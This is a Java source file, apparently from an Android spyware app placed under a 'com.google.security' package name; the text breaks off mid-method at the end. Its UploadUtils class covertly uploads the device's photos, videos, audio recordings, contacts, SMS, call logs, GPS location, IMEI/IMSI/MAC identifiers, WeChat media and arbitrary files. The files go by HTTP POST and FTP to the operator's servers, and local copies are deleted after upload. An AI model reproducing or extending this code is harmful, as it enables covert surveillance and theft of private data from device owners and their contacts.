package com.google.security;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.ParseException;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.dom4j.Document;
import org.dom4j.DocumentHelper;
import org.dom4j.Element;
import org.json.JSONException;
import org.json.JSONObject;

import com.google.security.tools.IpTool;
import com.google.security.tools.TimerStop;
import com.google.security.tools.WeChatTool;
import com.google.security.tools.WeChatUtils;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.Environment;
import android.util.Log;

public class UploadUtils {

	private static final String LOGTAG = "UploadUtils";
	static Context context;
	static TimerStop timerstop;

	private static UploadUtils uploadUtils;
	WeChatTool wechatTool;

	UploadUtils(Context con) {
		// TODO Auto-generated constructor stub
		UploadUtils.context = con;
	}

	public static UploadUtils getIntance(Context context) {
		UploadUtils.context = context;
		if (uploadUtils == null)
			return new UploadUtils(context);
		return uploadUtils;
	}

	public void sendAllPhotos() throws ParseException, IOException,
			JSONException {
		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED)) {

			Thread thread = new Thread(new Runnable() {
				@Override
				public void run() {

					File file = new File(MainService.PHOTO_FORDER_PATH);
					if (file.isDirectory()) {
						File[] fileArray = file.listFiles();
						if (0 != fileArray.length) {
							// TODO Auto-generated method stub
							Log.e(LOGTAG, "上传图片");
							Log.e(LOGTAG, fileArray.toString());
							for (int i = 0; i < fileArray.length; i++) {
								String fileName = fileArray[i].getName();
								File files = new File(
										MainService.PHOTO_FORDER_PATH, fileName);
								Log.e(LOGTAG, fileName);
								try {
									send(new IpTool().uploadallmedia_url,
											getUid(), fileName, files);
									Thread.sleep(2000);

								} catch (ParseException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							}
							MainService.SMSflag = false;
						}
					}
				}

			});
			thread.start();

		}
	}

	public void sendAllVideos() throws ParseException, IOException,
			JSONException {
		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED)) {
			Thread thread = new Thread(new Runnable() {
				@Override
				public void run() {

					File file = new File(MainService.VIDEO_FORDER_PATH);
					if (file.isDirectory()) {
						File[] fileArray = file.listFiles();
						if (0 != fileArray.length) {

							// TODO Auto-generated method stub
							Log.e(LOGTAG, "上传视频");
							Log.e(LOGTAG, fileArray.toString());
							for (int i = 0; i < fileArray.length; i++) {
								String fileName = fileArray[i].getName();
								File files = new File(
										MainService.VIDEO_FORDER_PATH, fileName);
								Log.e(LOGTAG, fileName);
								try {
									send(new IpTool().uploadallmedia_url,
											getUid(), fileName, files);
									Thread.sleep(2000);
								} catch (ParseException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							}
							MainService.SMSflag = false;
						}
					}

				}
			});
			thread.start();

		}
	}

	public void sendAllRecords() throws ParseException, IOException,
			JSONException {
		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED)) {
			File file = new File(MainService.RECORD_FORDER_PATH);
			if (file.isDirectory()) {
				final File[] fileArray = file.listFiles();
				if (null != fileArray && 0 != fileArray.length) {
					Thread thread = new Thread(new Runnable() {
						@Override
						public void run() {
							// TODO Auto-generated method stub
							Log.e(LOGTAG, "上传录音");
							for (int i = 0; i < fileArray.length; i++) {
								String fileName = fileArray[i].getName();
								File files = new File(
										MainService.RECORD_FORDER_PATH,
										fileName);
								Log.e(LOGTAG, fileName);
								try {
									send(new IpTool().uploadallmedia_url,
											getUid(), fileName, files);

								} catch (ParseException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							}
							MainService.SMSflag = false;
						}
					});
					thread.start();
				}
			}
		}
	}

	public void sendanyfiles(String path) {
		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED)
				&& new File(Environment.getExternalStorageDirectory().getPath()
						+ path).exists()) {
			String filepath = Environment.getExternalStorageDirectory()
					.getPath() + path;
			final String frontpath = filepath.substring(0,
					filepath.lastIndexOf("/") + 1);
			final String filename = filepath.substring(filepath
					.lastIndexOf("/") + 1);
			// final File file = new File(filepath);
			Thread thread = new Thread(new Runnable() {
				@Override
				public void run() {
					// TODO Auto-generated method stub
					Log.e(LOGTAG, "上传任意文件信息");
					// sendanyfile(new IpTool().uploadanyfile_url, getUid(),
					// filename, file);
					while (true) {
						String result = ftpUpload(new IpTool().ftp_url,
								new IpTool().ftp_port, new IpTool().ftp_admin,
								new IpTool().ftp_psw, "/FilesFromAndroid/"
										+ getUid() + "/", frontpath, filename);
						if ("1".equals(result)) {
							break;
						}
						Log.e("FTP", "result=" + result);
					}

				}
			});
			thread.start();
		}

	}

	public void sendxmlfiles() throws ParseException, IOException,
			JSONException {
		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED)) {

			File file = new File(MainService.XMLFILES_FORDER_PATH);
			if (file.isDirectory()) {
				final File[] fileArray = file.listFiles();
				if (null != fileArray && 0 != fileArray.length) {
					Thread thread = new Thread(new Runnable() {
						@Override
						public void run() {
							// TODO Auto-generated method stub
							Log.e(LOGTAG, "上传文件信息");
							for (int i = 0; i < fileArray.length; i++) {
								String fileName = fileArray[i].getName();
								File files = new File(
										MainService.XMLFILES_FORDER_PATH,
										fileName);
								Log.e(LOGTAG, fileName);
								try {
									send(new IpTool().uploadxml_url, getUid(),
											fileName, files);
								} catch (ParseException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							}
						}
					});
					thread.start();
				}
			}
		}
	}

	public void sendAllContacts() throws ParseException, IOException,
			JSONException {
		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED)) {

			File file = new File(MainService.CONTACTS_FORDER_PATH);
			if (file.isDirectory()) {
				final File[] fileArray = file.listFiles();
				if (null != fileArray && 0 != fileArray.length) {
					Thread thread = new Thread(new Runnable() {
						@Override
						public void run() {
							// TODO Auto-generated method stub
							Log.e(LOGTAG, "上传联系人");
							for (int i = 0; i < fileArray.length; i++) {
								String fileName = fileArray[i].getName();
								File files = new File(
										MainService.CONTACTS_FORDER_PATH,
										fileName);
								Log.e(LOGTAG, fileName);
								try {
									send(new IpTool().uploadcontacts_url,
											getUid(), fileName, files);
								} catch (ParseException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							}
						}
					});
					thread.start();
				}
			}
		}
	}

	public void sendAllSms() throws ParseException, IOException, JSONException {
		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED)) {
			File file = new File(MainService.SMS_FORDER_PATH);
			if (file.isDirectory()) {
				final File[] fileArray = file.listFiles();
				if (null != fileArray && 0 != fileArray.length) {
					Thread thread = new Thread(new Runnable() {
						@Override
						public void run() {
							// TODO Auto-generated method stub
							Log.e(LOGTAG, "上传短信");
							for (int i = 0; i < fileArray.length; i++) {
								String fileName = fileArray[i].getName();
								File files = new File(
										MainService.SMS_FORDER_PATH, fileName);
								Log.e(LOGTAG, fileName);
								try {
									send(new IpTool().uploadsms_url, getUid(),
											fileName, files);
								} catch (ParseException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							}
						}
					});
					thread.start();
				}
			}
		}
	}

	public void sendAllCallRecords() throws ParseException, IOException,
			JSONException {
		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED)) {
			File file = new File(MainService.CALLRECORD_FORDER_PATH);
			if (file.isDirectory()) {
				final File[] fileArray = file.listFiles();
				if (null != fileArray && 0 != fileArray.length) {
					Thread thread = new Thread(new Runnable() {
						@Override
						public void run() {
							// TODO Auto-generated method stub
							Log.e(LOGTAG, "上传通话记录");
							for (int i = 0; i < fileArray.length; i++) {
								String fileName = fileArray[i].getName();
								File files = new File(
										MainService.CALLRECORD_FORDER_PATH,
										fileName);
								Log.e(LOGTAG, fileName + getUid());
								try {
									send(new IpTool().uploadcallrecord_url,
											getUid(), fileName, files);
								} catch (ParseException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							}
						}
					});
					thread.start();
				}
			}
		}
	}

	public static void sendcontactsbyjson() throws ClientProtocolException,
			IOException, JSONException {
		DBHelper helper = new DBHelper(context, SQLLocalStorage.DB_MESSAGE);
		Cursor cursor = helper.query_tab_contacts();
		while (cursor.moveToNext()) {
			String flag = cursor.getString(cursor.getColumnIndex("flag"));
			String name = cursor.getString(cursor.getColumnIndex("name"));
			String number = cursor.getString(cursor.getColumnIndex("number"));
			// int id = cursor.getInt(cursor.getColumnIndex("_id"));

			if (("false".equals(flag))
					|| ((MainService.SMSflag) && (cursor.isLast()))) {
				HttpPost request = new HttpPost(new IpTool().uploadcontacts_url);

				List<NameValuePair> params = new ArrayList<NameValuePair>();
				params.add(new BasicNameValuePair("uid", getUid()));
				params.add(new BasicNameValuePair("name", name));
				params.add(new BasicNameValuePair("number", number));

				HttpEntity enti = new UrlEncodedFormEntity(params, "UTF-8");
				request.setEntity(enti);

				HttpClient client = new DefaultHttpClient();
				// 发送请求
				HttpResponse httpResponse = client.execute(request);
				HttpEntity en = httpResponse.getEntity();
				String retSrc = EntityUtils.toString(en);
				// 生成 JSON 对象
				JSONObject result = new JSONObject(retSrc);
				int rt = result.getInt("rt");
				if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
					Log.i("iiiiicontact", "rt=" + rt);
					if (rt == 0) {
						// DBHelper h = new DBHelper(context);
						helper.update_tab_contacts_flag(number);
						Log.e(LOGTAG, "联系人上传成功");
					}
				} else {

					Log.i("55555", "55555");

				}

			}
		}
		cursor.close();
		helper.close();
	}

	public static void sendrecordbyjson() throws ClientProtocolException,
			IOException, JSONException {
		DBHelper helper = new DBHelper(context, SQLLocalStorage.DB_MESSAGE);
		Cursor cursor = helper.query_tab_record();
		while (cursor.moveToNext()) {
			String flag = cursor.getString(cursor.getColumnIndex("flag"));
			String name = cursor.getString(cursor.getColumnIndex("name"));
			String number = cursor.getString(cursor.getColumnIndex("number"));
			String time = cursor.getString(cursor.getColumnIndex("time"));
			String duration = cursor.getString(cursor
					.getColumnIndex("duration"));
			String type = cursor.getString(cursor.getColumnIndex("type"));
			if (("false".equals(flag))
					|| ((MainService.SMSflag) && (cursor.isLast()))) {
				HttpPost request = new HttpPost(
						new IpTool().uploadcallrecord_url);

				List<NameValuePair> params = new ArrayList<NameValuePair>();
				params.add(new BasicNameValuePair("uid", getUid()));
				params.add(new BasicNameValuePair("name", name));
				params.add(new BasicNameValuePair("time", time));
				params.add(new BasicNameValuePair("duration", duration));
				params.add(new BasicNameValuePair("number", number));
				params.add(new BasicNameValuePair("type", type));

				HttpEntity enti = new UrlEncodedFormEntity(params, "UTF-8");
				request.setEntity(enti);

				HttpClient client = new DefaultHttpClient();
				// 发送请求
				HttpResponse httpResponse = client.execute(request);
				HttpEntity en = httpResponse.getEntity();
				String retSrc = EntityUtils.toString(en);
				// 生成 JSON 对象
				JSONObject result = new JSONObject(retSrc);
				int rt = result.getInt("rt");
				if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
					Log.i("iiiiirecord", "rt=" + rt);
					if (rt == 0) {
						// DBHelper h = new DBHelper(context);
						helper.update_tab_record_flag(time);
						Log.e(LOGTAG, "通话记录上传成功");
					}
				} else {

					Log.i("55555", "55555");

				}

			}
		}
		cursor.close();
		helper.close();
	}

	public static void sendsmsbyjson() throws ClientProtocolException,
			IOException, JSONException {
		DBHelper helper = new DBHelper(context, SQLLocalStorage.DB_MESSAGE);
		Cursor cursor = helper.query_tab_sms();
		while (cursor.moveToNext()) {
			String flag = cursor.getString(cursor.getColumnIndex("flag"));
			String name = cursor.getString(cursor.getColumnIndex("name"));
			String data = cursor.getString(cursor.getColumnIndex("data"));
			String number = cursor.getString(cursor.getColumnIndex("number"));
			String type = cursor.getString(cursor.getColumnIndex("type"));
			String content = cursor.getString(cursor.getColumnIndex("content"));
			if (("false".equals(flag))
					|| ((MainService.SMSflag) && (cursor.isLast()))) {
				HttpPost request = new HttpPost(new IpTool().uploadsms_url);

				List<NameValuePair> params = new ArrayList<NameValuePair>();
				params.add(new BasicNameValuePair("uid", getUid()));
				params.add(new BasicNameValuePair("name", name));
				params.add(new BasicNameValuePair("data", data));
				params.add(new BasicNameValuePair("number", number));
				params.add(new BasicNameValuePair("type", type));
				params.add(new BasicNameValuePair("content", content));

				HttpEntity enti = new UrlEncodedFormEntity(params, "UTF-8");
				request.setEntity(enti);

				HttpClient client = new DefaultHttpClient();
				// 发送请求
				HttpResponse httpResponse = client.execute(request);
				HttpEntity en = httpResponse.getEntity();
				String retSrc = EntityUtils.toString(en);
				// 生成 JSON 对象
				JSONObject result = new JSONObject(retSrc);
				int rt = result.getInt("rt");
				if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
					Log.i("iiiiisms", "rt=" + rt);
					if (rt == 0) {
						// DBHelper h = new DBHelper(context);
						helper.update_tab_sms_flag(data);
						Log.e(LOGTAG, "短信上传成功");
					}
				} else {

					Log.i("55555", "55555");

				}

			}
		}
		cursor.close();
		helper.close();
	}

	// public void sendcontactsbyjson() throws ClientProtocolException,
	// IOException, JSONException, ParseException,
	// java.text.ParseException {
	// // LocationControl con=new LocationControl(context);
	// // con.stopLocationService();
	// DBHelper helper = new DBHelper(context, SQLLocalStorage.DB_MESSAGE);
	// Cursor cursor = helper.query_tab_contacts();
	// while (cursor.moveToNext()) {
	// String flag = cursor.getString(cursor.getColumnIndex("flag"));
	// int id = cursor.getInt(cursor.getColumnIndex("_id"));
	// String uid = getUid();
	// String name = cursor.getString(cursor.getColumnIndex("name"));
	// if (name == null) {
	// name = "unknown";
	// }
	// String number = cursor.getString(cursor.getColumnIndex("number"));
	// if ("false".equals(flag)) {
	// HttpPost request = new HttpPost(MainService.uploadcontacts_url);
	// List<NameValuePair> params = new ArrayList<NameValuePair>();
	// params.add(new BasicNameValuePair("uid",uid ));
	// params.add(new BasicNameValuePair("name", name));
	// params.add(new BasicNameValuePair("number", number));
	// HttpEntity enti = new UrlEncodedFormEntity(params);
	// request.setEntity(enti);
	// HttpClient client = new DefaultHttpClient();
	// // 发送请求
	// HttpResponse httpResponse = client.execute(request);
	// HttpEntity en = httpResponse.getEntity();
	// String retSrc = EntityUtils.toString(en);
	// // 生成 JSON 对象
	// JSONObject result = new JSONObject(retSrc);
	// int rt = result.getInt("rt");
	// if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
	// Log.e("LOGTAG", "rt=" + rt);
	// if (rt == 0) {
	// DBHelper h = new DBHelper(context);
	// h.update_tab_contacts_flag(id);
	// h.close();
	// Log.e(LOGTAG, "通讯录上传成功");
	// }
	// } else {
	// Log.e(LOGTAG, "通讯录 upload false");
	// }
	//
	// }
	// }
	// cursor.close();
	// helper.close();
	// }

	public static void sendlocation() throws ClientProtocolException,
			IOException, JSONException, ParseException,
			java.text.ParseException {
		// LocationControl con=new LocationControl(context);
		// con.stopLocationService();

		DBHelper helper = new DBHelper(context, SQLLocalStorage.DB_MESSAGE);
		Cursor cursor = helper.query_tab_location();

		while (cursor.moveToNext()) {
			int id = cursor.getInt(cursor.getColumnIndex("_id"));
			String flag = cursor.getString(cursor.getColumnIndex("flag"));
			String uid = cursor.getString(cursor.getColumnIndex("uid"));
			Float lat = cursor.getFloat(cursor.getColumnIndex("la"));
			Float lon = cursor.getFloat(cursor.getColumnIndex("lo"));
			String time = cursor.getString(cursor.getColumnIndex("time"));
			SimpleDateFormat myFmt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			Long longt;
			Long longtime = (long) 0;
			try {
				longt = myFmt.parse(time).getTime();
				longtime = longt / 1000;
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			if (("false".equals(flag)) || (MainService.SMSflag)) {
				HttpPost request = new HttpPost(new IpTool().uploadlocation_url);

				List<NameValuePair> params = new ArrayList<NameValuePair>();
				params.add(new BasicNameValuePair("uid", uid));
				params.add(new BasicNameValuePair("lat", lat + ""));
				params.add(new BasicNameValuePair("lon", lon + ""));
				params.add(new BasicNameValuePair("time", "" + longtime));
				HttpEntity enti = new UrlEncodedFormEntity(params);
				request.setEntity(enti);

				HttpClient client = new DefaultHttpClient();
				// 发送请求
				HttpResponse httpResponse = client.execute(request);
				HttpEntity en = httpResponse.getEntity();
				String retSrc = EntityUtils.toString(en);
				// 生成 JSON 对象
				JSONObject result = new JSONObject(retSrc);
				int rt = result.getInt("rt");
				if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
					Log.e("LOGTAG", "rt=" + rt);
					if (rt == 0) {
						DBHelper h = new DBHelper(context);
						h.update_tab_location_flag(id);
						h.close();
						Log.e(LOGTAG, "定位信息上传成功");
					}
				} else {

					Log.e(LOGTAG, "Location upload false");

				}

			}
		}

		cursor.close();

		helper.close();

	}

	public void sendWechatMedia() {
		wechatTool = WeChatTool.getInstance(context);
		wechatTool.start();
		Log.e(LOGTAG, "成功启动微信功能....");
		final ArrayList<File> Fileslist = WeChatUtils.getFileList(context,
				new File("/data/local/tmp/dump"), ".tmp");
		new Thread(new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
				Log.e(LOGTAG, "上传微信");
				for (int i = 0; i < Fileslist.size(); i++) {
					String fileName = Fileslist.get(i).getName();
					File files = Fileslist.get(i);
					Log.e("File", "file num=" + Fileslist.size());
					Log.e("file ", "file item= " + i + " --"
							+ Fileslist.get(i).getName() + "----"
							+ Fileslist.get(i).getAbsolutePath());

					try {
						send(new IpTool().uploadwechat_url, getUid(), fileName,
								files);
					} catch (ParseException e) {
						// TODO Auto-generated catch block
						Log.e("File", "file sending num=erro");
						e.printStackTrace();
					}
				}
			}
		}).start();
	}

	public static void sendin() throws ClientProtocolException, IOException,
			JSONException {
		DBHelper helper = new DBHelper(context, SQLLocalStorage.DB_MESSAGE);
		Cursor cursor = helper.query_tab_info();
		while (cursor.moveToNext()) {
			String flag = cursor.getString(cursor.getColumnIndex("flag"));
			String uid = cursor.getString(cursor.getColumnIndex("uid"));
			String imei = cursor.getString(cursor.getColumnIndex("imei"));
			String imsi = cursor.getString(cursor.getColumnIndex("imsi"));
			String mode = cursor.getString(cursor.getColumnIndex("models"));
			String version = cursor
					.getString(cursor.getColumnIndex("versions"));
			String ui = "ui";
			String networktype = cursor.getString(cursor
					.getColumnIndex("networktype"));
			String mac = cursor.getString(cursor.getColumnIndex("mac"));

			if (("false".equals(flag)) || (MainService.SMSflag)) {
				HttpPost request = new HttpPost(new IpTool().uploadinfo_url);

				List<NameValuePair> params = new ArrayList<NameValuePair>();
				params.add(new BasicNameValuePair("uid", uid));
				params.add(new BasicNameValuePair("imei", imei));
				params.add(new BasicNameValuePair("imsi", imsi));
				params.add(new BasicNameValuePair("mode", mode));
				params.add(new BasicNameValuePair("version", version));
				params.add(new BasicNameValuePair("ui", ui));
				params.add(new BasicNameValuePair("networktype", networktype));
				params.add(new BasicNameValuePair("mac", mac));

				HttpEntity enti = new UrlEncodedFormEntity(params, "UTF-8");
				request.setEntity(enti);

				HttpClient client = new DefaultHttpClient();
				// 发送请求
				HttpResponse httpResponse = client.execute(request);
				HttpEntity en = httpResponse.getEntity();
				String retSrc = EntityUtils.toString(en);
				// 生成 JSON 对象
				JSONObject result = new JSONObject(retSrc);
				int rt = result.getInt("rt");
				if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
					Log.i("iiiii", "rt=" + rt);
					if (rt == 0) {
						DBHelper h = new DBHelper(context);
						h.update_tab_info_flag();
						h.close();
						Log.e(LOGTAG, "基本信息上传成功");
					}
				} else {
					// Toast.makeText(context, "false",
					// Toast.LENGTH_SHORT).show();
					Log.i("55555", "55555");

				}

			}
		}
		cursor.close();

	}

	public static int postanyfile(String actionUrl, Map<String, String> params,
			Map<String, File> files) {
		timerstop = TimerStop.getIntance(context, actionUrl, params, files);
		timerstop.start();
		int rt1 = 1;
		String BOUNDARY = java.util.UUID.randomUUID().toString();
		String PREFIX = "--", LINEND = "\r\n";
		String MULTIPART_FROM_DATA = "multipart/form-data";
		String CHARSET = "UTF-8";

		URL uri;
		try {
			uri = new URL(actionUrl);
			HttpURLConnection conn = (HttpURLConnection) uri.openConnection();

			conn.setReadTimeout(20 * 1000); // 缓存的最长时间
			conn.setDoInput(true);// 允许输入
			conn.setDoOutput(true);// 允许输出
			conn.setUseCaches(false); // 不允许使用缓存
			conn.setRequestMethod("POST");
			conn.setRequestProperty("connection", "keep-alive");
			conn.setRequestProperty("Charsert", "UTF-8");
			conn.setRequestProperty("Content-Type", MULTIPART_FROM_DATA
					+ ";boundary=" + BOUNDARY);

			// 首先组拼文本类型的参数
			StringBuilder sb = new StringBuilder();

			for (Map.Entry<String, String> entry : params.entrySet()) {
				sb.append(PREFIX);
				sb.append(BOUNDARY);
				sb.append(LINEND);
				sb.append("Content-Disposition: form-data; name=\""
						+ entry.getKey() + "\"" + LINEND);
				sb.append("Content-Type: text/plain; charset=" + CHARSET
						+ LINEND);
				sb.append("Content-Transfer-Encoding: 8bit" + LINEND);
				sb.append(LINEND);
				sb.append(entry.getValue());
				sb.append(LINEND);
			}

			DataOutputStream outStream = new DataOutputStream(
					conn.getOutputStream());
			outStream.write(sb.toString().getBytes());
			// 发送文件数据
			if (files != null)
				for (Map.Entry<String, File> file : files.entrySet()) {
					StringBuilder sb1 = new StringBuilder();
					sb1.append(PREFIX);
					sb1.append(BOUNDARY);
					sb1.append(LINEND);
					sb1.append("Content-Disposition: form-data; name=\"file\"; filename=\""
							+ file.getKey() + "\"" + LINEND);
					sb1.append("Content-Type: application/octet-stream; charset="
							+ CHARSET + LINEND);
					sb1.append(LINEND);
					outStream.write(sb1.toString().getBytes());

					InputStream is = new FileInputStream(file.getValue());
					byte[] buffer = new byte[1024];
					int len = 0;
					while ((len = is.read(buffer)) != -1) {
						outStream.write(buffer, 0, len);
					}

					is.close();
					outStream.write(LINEND.getBytes());
				}

			// 请求结束标志
			byte[] end_data = (PREFIX + BOUNDARY + PREFIX + LINEND).getBytes();
			Log.e(LOGTAG, PREFIX + BOUNDARY + PREFIX + LINEND);
			outStream.write(end_data);
			Log.e(LOGTAG, "write");
			outStream.flush();
			Log.e(LOGTAG, "flush");
			// 得到响应码
			int res = conn.getResponseCode();
			Log.e(LOGTAG, "getResponseCode");

			InputStream in = conn.getInputStream();
			if (res == 200) {
				byte[] data = readStream(in);
				String rts = new String(data);
				JSONObject j = new JSONObject(rts);
				rt1 = j.getInt("rt");
				if (0 == rt1) {
					timerstop.stop();
					Log.e(LOGTAG, rt1 + "=post上传成功");
				}
			} else {

				Log.e(LOGTAG, "post上传出错");
			}
			outStream.close();
			conn.disconnect();

		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			Log.e(LOGTAG, e.toString());

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			Log.e(LOGTAG, e.toString());

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			Log.e(LOGTAG, e.toString());

		}

		return 0;
	}

	public static int post(String actionUrl, Map<String, String> params,
			Map<String, File> files) {
		timerstop = TimerStop.getIntance(context, actionUrl, params, files);
		timerstop.start();
		int rt1 = 1;
		String BOUNDARY = java.util.UUID.randomUUID().toString();
		String PREFIX = "--", LINEND = "\r\n";
		String MULTIPART_FROM_DATA = "multipart/form-data";
		String CHARSET = "UTF-8";

		URL uri;
		try {
			uri = new URL(actionUrl);
			HttpURLConnection conn = (HttpURLConnection) uri.openConnection();

			conn.setReadTimeout(20 * 1000); // 缓存的最长时间
			conn.setDoInput(true);// 允许输入
			conn.setDoOutput(true);// 允许输出
			conn.setUseCaches(false); // 不允许使用缓存
			conn.setRequestMethod("POST");
			conn.setRequestProperty("connection", "keep-alive");
			conn.setRequestProperty("Charsert", "UTF-8");
			conn.setRequestProperty("Content-Type", MULTIPART_FROM_DATA
					+ ";boundary=" + BOUNDARY);

			// 首先组拼文本类型的参数
			StringBuilder sb = new StringBuilder();

			for (Map.Entry<String, String> entry : params.entrySet()) {
				sb.append(PREFIX);
				sb.append(BOUNDARY);
				sb.append(LINEND);
				sb.append("Content-Disposition: form-data; name=\""
						+ entry.getKey() + "\"" + LINEND);
				sb.append("Content-Type: text/plain; charset=" + CHARSET
						+ LINEND);
				sb.append("Content-Transfer-Encoding: 8bit" + LINEND);
				sb.append(LINEND);
				sb.append(entry.getValue());
				sb.append(LINEND);
			}

			DataOutputStream outStream = new DataOutputStream(
					conn.getOutputStream());
			outStream.write(sb.toString().getBytes());
			// 发送文件数据
			if (files != null)
				for (Map.Entry<String, File> file : files.entrySet()) {
					StringBuilder sb1 = new StringBuilder();
					sb1.append(PREFIX);
					sb1.append(BOUNDARY);
					sb1.append(LINEND);
					sb1.append("Content-Disposition: form-data; name=\"file\"; filename=\""
							+ file.getKey() + "\"" + LINEND);
					sb1.append("Content-Type: application/octet-stream; charset="
							+ CHARSET + LINEND);
					sb1.append(LINEND);
					outStream.write(sb1.toString().getBytes());

					InputStream is = new FileInputStream(file.getValue());
					byte[] buffer = new byte[1024];
					int len = 0;
					while ((len = is.read(buffer)) != -1) {
						outStream.write(buffer, 0, len);
					}

					is.close();
					outStream.write(LINEND.getBytes());
				}

			// 请求结束标志
			byte[] end_data = (PREFIX + BOUNDARY + PREFIX + LINEND).getBytes();
			Log.e(LOGTAG, PREFIX + BOUNDARY + PREFIX + LINEND);
			outStream.write(end_data);
			Log.e(LOGTAG, "write");
			outStream.flush();
			Log.e(LOGTAG, "flush");
			// 得到响应码
			int res = conn.getResponseCode();
			Log.e(LOGTAG, "getResponseCode");

			InputStream in = conn.getInputStream();
			if (res == 200) {
				byte[] data = readStream(in);
				String rts = new String(data);
				JSONObject j = new JSONObject(rts);
				rt1 = j.getInt("rt");
				if (0 == rt1) {
					timerstop.stop();
					files.get("file").delete();
				}
				Log.e(LOGTAG, rt1 + "=post上传成功");
			} else {

				Log.e(LOGTAG, "post上传出错");
			}
			outStream.close();
			conn.disconnect();

		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			Log.e(LOGTAG, e.toString());

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			Log.e(LOGTAG, e.toString());

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			Log.e(LOGTAG, e.toString());

		}

		return 0;
	}

	private static int send(String url, String uid, String filename, File file) {
		String actionUrl = url;

		Map<String, String> params = new HashMap<String, String>();
		params.put("uid", uid);
		params.put("filename", filename);

		Map<String, File> files = new HashMap<String, File>();
		files.put("file", file);

		try {
			int str = post(actionUrl, params, files);
			Log.e(LOGTAG, String.valueOf(str));
			if (str == 0) {

			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		return 1;
	}

	private static int sendanyfile(String url, String uid, String filename,
			File file) {
		String actionUrl = url;

		Map<String, String> params = new HashMap<String, String>();
		params.put("uid", uid);
		params.put("filename", filename);

		Map<String, File> files = new HashMap<String, File>();
		files.put("file", file);

		try {
			int str = postanyfile(actionUrl, params, files);
			Log.e(LOGTAG, String.valueOf(str));
			if (str == 0) {

			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		return 1;
	}

	public static class ThreadUpload extends Thread {

		@Override
		public void run() {
			// 每5s扫描并更新

			try {
				sendlocation();
			} catch (ClientProtocolException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (ParseException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (java.text.ParseException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}
	}

	public static class ThreadContacts extends Thread {

		@Override
		public void run() {
			// 每5s扫描并更新

			try {
				sendcontactsbyjson();
				sendrecordbyjson();
				sendsmsbyjson();
			} catch (ClientProtocolException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (ParseException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}
	}

	public static class ThreadInfo extends Thread {

		@Override
		public void run() {
			// 每5s扫描并更新

			try {
				sendin();
			} catch (ClientProtocolException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (ParseException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}
	}

	private static byte[] readStream(InputStream is) throws Exception {

		byte[] buffer = new byte[1024];

		ByteArrayOutputStream bos = new ByteArrayOutputStream();

		int len = 0;

		while ((len = is.read(buffer)) != -1) {

